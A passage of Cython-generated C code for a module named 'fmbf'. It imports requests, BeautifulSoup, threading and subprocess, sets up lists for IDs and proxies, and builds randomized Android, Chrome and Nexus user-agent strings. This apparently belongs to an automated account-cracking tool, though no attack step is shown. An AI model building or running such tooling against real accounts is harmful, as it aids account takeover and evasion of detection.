  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  
  
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("fmbf", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_fmbf) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name_2, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "fmbf")) {
      if (unlikely(PyDict_SetItemString(modules, "fmbf", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  if (unlikely(__Pyx_modinit_type_init_code() < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_re, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_re, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_bs4, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bs4, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_subprocess, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
  __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_ThreadPoolExecutor);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ThreadPoolExecutor, __pyx_t_1) < 0) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_BeautifulSoup);
  __Pyx_GIVEREF(__pyx_n_s_BeautifulSoup);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_BeautifulSoup);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_bs4, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_BeautifulSoup); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_parser, __pyx_t_2) < 0) __PYX_ERR(0, 3, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_date);
  __Pyx_GIVEREF(__pyx_n_s_date);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_date);
  __Pyx_INCREF(__pyx_n_s_datetime);
  __Pyx_GIVEREF(__pyx_n_s_datetime);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_datetime);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_datetime, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_date); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datetime, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_ConnectionError);
  __Pyx_GIVEREF(__pyx_n_s_ConnectionError);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_ConnectionError);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests_exceptions, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ConnectionError, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_requests); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_Session); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ses, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_s_1_91m) < 0) __PYX_ERR(0, 8, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_H, __pyx_kp_s_1_92m) < 0) __PYX_ERR(0, 9, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_K, __pyx_kp_s_1_93m) < 0) __PYX_ERR(0, 10, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_N, __pyx_kp_s_0m) < 0) __PYX_ERR(0, 11, __pyx_L1_error)

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tampung, __pyx_t_1) < 0) __PYX_ERR(0, 12, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_idz, __pyx_t_1) < 0) __PYX_ERR(0, 13, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ugent, __pyx_t_1) < 0) __PYX_ERR(0, 14, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_prox, __pyx_t_1) < 0) __PYX_ERR(0, 15, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_usragent, __pyx_t_1) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ugen2, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  for (__pyx_t_3 = 0; __pyx_t_3 < 0xC8; __pyx_t_3+=1) {
    __pyx_t_1 = __Pyx_PyInt_From_long(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_z, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_0_0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_versi_android, __pyx_t_1) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randint); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__77, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_kp_s_0_0_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__78, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = PyNumber_Add(__pyx_t_2, __pyx_kp_s__32); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__33, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = PyNumber_Add(__pyx_t_4, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_versi_chrome, __pyx_t_2) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyList_New(8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_INCREF(__pyx_kp_s_Nexus_5_Build_NHG47L);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_5_Build_NHG47L);
    PyList_SET_ITEM(__pyx_t_1, 0, __pyx_kp_s_Nexus_5_Build_NHG47L);
    __Pyx_INCREF(__pyx_kp_s_Nexus_7_Build_LMY47V);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_7_Build_LMY47V);
    PyList_SET_ITEM(__pyx_t_1, 1, __pyx_kp_s_Nexus_7_Build_LMY47V);
    __Pyx_INCREF(__pyx_kp_s_Nexus_5X_Build_N4F26T);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_5X_Build_N4F26T);
    PyList_SET_ITEM(__pyx_t_1, 2, __pyx_kp_s_Nexus_5X_Build_N4F26T);
    __Pyx_INCREF(__pyx_kp_s_Nexus_6P_Build_OPM5_171019_014);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_6P_Build_OPM5_171019_014);
    PyList_SET_ITEM(__pyx_t_1, 3, __pyx_kp_s_Nexus_6P_Build_OPM5_171019_014);
    __Pyx_INCREF(__pyx_kp_s_Nexus_5X_Build_OPR6_170623_023);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_5X_Build_OPR6_170623_023);
    PyList_SET_ITEM(__pyx_t_1, 4, __pyx_kp_s_Nexus_5X_Build_OPR6_170623_023);
    __Pyx_INCREF(__pyx_kp_s_Nexus_6_Build_OPM5_171019_015);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_6_Build_OPM5_171019_015);
    PyList_SET_ITEM(__pyx_t_1, 5, __pyx_kp_s_Nexus_6_Build_OPM5_171019_015);
    __Pyx_INCREF(__pyx_kp_s_Nexus_5X_Build_MMB29K);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_5X_Build_MMB29K);
    PyList_SET_ITEM(__pyx_t_1, 6, __pyx_kp_s_Nexus_5X_Build_MMB29K);
    __Pyx_INCREF(__pyx_kp_s_Nexus_5X_Build_OPM6_171019_030_H);
    __Pyx_GIVEREF(__pyx_kp_s_Nexus_5X_Build_OPM6_171019_030_H);
    PyList_SET_ITEM(__pyx_t_1, 7, __pyx_kp_s_Nexus_5X_Build_OPM6_171019_030_H);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_1);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_device, __pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_4)) {
